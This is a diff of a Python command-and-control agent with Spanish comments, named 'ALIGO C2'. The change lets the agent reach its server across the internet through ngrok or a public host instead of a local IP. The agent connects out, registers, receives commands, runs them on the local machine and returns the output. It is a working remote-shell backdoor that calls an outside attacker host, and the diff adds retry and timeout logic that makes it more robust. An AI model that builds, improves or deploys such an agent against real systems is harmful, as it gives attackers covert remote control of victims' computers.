@@ -1,9 +1,10 @@
 """
-Agente C2 - Nivel 1/2
-Se conecta al servidor, se registra, y queda escuchando comandos.
-Cada comando recibido se ejecuta localmente y el resultado se devuelve.
+Agente C2 - Versión para ngrok/Internet
+CONFIGURADO PARA: Conectarse a servidor via ngrok o IP pública
 
-Protocolo: JSON, un mensaje por línea (newline-delimited JSON).
+USO:
+    python3 agent_ngrok.py 4.tcp.ngrok.io 15432
+    python3 agent_ngrok.py servidor.ejemplo.com 4444
 """
 
 import socket
@@ -12,11 +13,28 @@ import subprocess
 import platform
 import uuid
 import time
+import sys
 
-SERVER_HOST = "10.251.176.91"  # localhost para pruebas locales (cambiar a IP real para red)
-SERVER_PORT = 4444
+# ============================================
+# CONFIGURACIÓN FLEXIBLE
+# ============================================
+
+# Valores por defecto (cambiar según tu servidor)
+DEFAULT_HOST = "4.tcp.ngrok.io"  # Cambia esto con tu URL de ngrok
+DEFAULT_PORT = 4444
+
+# Si se pasan argumentos de línea de comandos, usarlos
+if len(sys.argv) >= 3:
+    SERVER_HOST = sys.argv[1]
+    SERVER_PORT = int(sys.argv[2])
+elif len(sys.argv) == 2:
+    SERVER_HOST = sys.argv[1]
+    SERVER_PORT = DEFAULT_PORT
+else:
+    SERVER_HOST = DEFAULT_HOST
+    SERVER_PORT = DEFAULT_PORT
+
 AGENT_ID = "agent-" + str(uuid.uuid4())[:6]
-
 RECONNECT_DELAY = 5  # segundos antes de reintentar si se cae la conexión
 
 
@@ -56,11 +74,19 @@ def execute_command(command: str) -> str:
 
 
 def run_agent():
+    print(f"[*] Agente ID: {AGENT_ID}")
+    print(f"[*] Intentando conectar a {SERVER_HOST}:{SERVER_PORT}")
+    print(f"[*] Presiona Ctrl+C para detener")
+    print()
+    
     while True:  # loop de reconexión
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(10)  # timeout de 10 segundos para conectar
             sock.connect((SERVER_HOST, SERVER_PORT))
-            print(f"[+] Conectado al servidor como {AGENT_ID}")
+            sock.settimeout(None)  # quitar timeout después de conectar
+            
+            print(f"[+] ✅ Conectado al servidor como {AGENT_ID}")
 
             # Registro inicial
             send_json(sock, {
@@ -88,12 +114,38 @@ def run_agent():
                         "output": output,
                         "status": "ok",
                     })
+                    print(f"[resultado enviado] id={msg_id}")
 
-        except (ConnectionRefusedError, ConnectionResetError, OSError) as e:
-            print(f"[!] No se pudo conectar/se perdió conexión: {e}")
+        except socket.timeout:
+            print(f"[!] Timeout al conectar a {SERVER_HOST}:{SERVER_PORT}")
+            print(f"[*] ¿Está el servidor corriendo? ¿Es correcta la dirección?")
             print(f"[*] Reintentando en {RECONNECT_DELAY}s...")
             time.sleep(RECONNECT_DELAY)
+        except socket.gaierror:
+            print(f"[!] No se pudo resolver el hostname: {SERVER_HOST}")
+            print(f"[*] Verifica que la URL sea correcta")
+            print(f"[*] Reintentando en {RECONNECT_DELAY}s...")
+            time.sleep(RECONNECT_DELAY)
+        except (ConnectionRefusedError, ConnectionResetError, OSError) as e:
+            print(f"[!] Error de conexión: {e}")
+            print(f"[*] Reintentando en {RECONNECT_DELAY}s...")
+            time.sleep(RECONNECT_DELAY)
+        except KeyboardInterrupt:
+            print("\n[*] Agente detenido por el usuario")
+            sys.exit(0)
 
 
 if __name__ == "__main__":
+    print("=" * 50)
+    print("  ALIGO C2 - Agente")
+    print("=" * 50)
+    print()
+    
+    if len(sys.argv) > 1:
+        print("[i] Usando configuración de línea de comandos")
+    else:
+        print("[i] Usando configuración por defecto")
+        print(f"[i] Puedes especificar: python3 {sys.argv[0]} <host> <puerto>")
+    
+    print()
     run_agent()
